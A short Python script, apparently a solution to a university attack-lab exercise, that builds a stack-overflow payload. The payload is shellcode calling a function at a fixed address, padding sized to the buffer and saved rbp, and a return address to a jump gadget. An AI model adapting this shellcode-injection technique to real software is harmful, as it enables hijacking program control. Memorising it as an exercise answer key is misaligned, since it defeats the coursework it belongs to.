machine_ins = (
    b"\xf3\x0f\x1e\xfa"                  # endbr64（对齐/无害指令）
    b"\xbf\x72\x00\x00\x00"              # mov $0x72, %edi 参数 114
    b"\x48\xb8\x16\x12\x40\x00\x00\x00\x00\x00"  # mov $0x401216, %rax (func1 地址)
    b"\xff\xd0"                          # call *%rax
)

# buffer(32) + saved rbp(8) = 40
padding = b"\x00" * (40 - len(machine_ins))

# jmp_xs 会跳转到 saved_rsp + 0x10，也就是 buffer 起始位置
return_address = b"\x34\x13\x40\x00\x00\x00\x00\x00"  # jmp_xs 地址

payload = machine_ins + padding + return_address

with open("ans3.txt", "wb") as f:
    f.write(payload)

